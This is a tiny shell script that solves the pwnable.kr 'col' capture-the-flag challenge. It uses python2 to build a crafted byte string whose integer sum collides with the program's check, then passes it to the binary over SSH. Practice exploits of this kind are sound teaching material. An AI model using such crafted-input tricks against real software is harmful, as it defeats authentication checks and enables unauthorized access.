#!/usr/bin/env sh

cmd="./col `python2 -c 'print 4 * "\xc8\xce\xc5\x06\" + "\xcc\xce\xc5\x06\"'`"
ssh col@pwnable.kr -p2222 "$cmd"
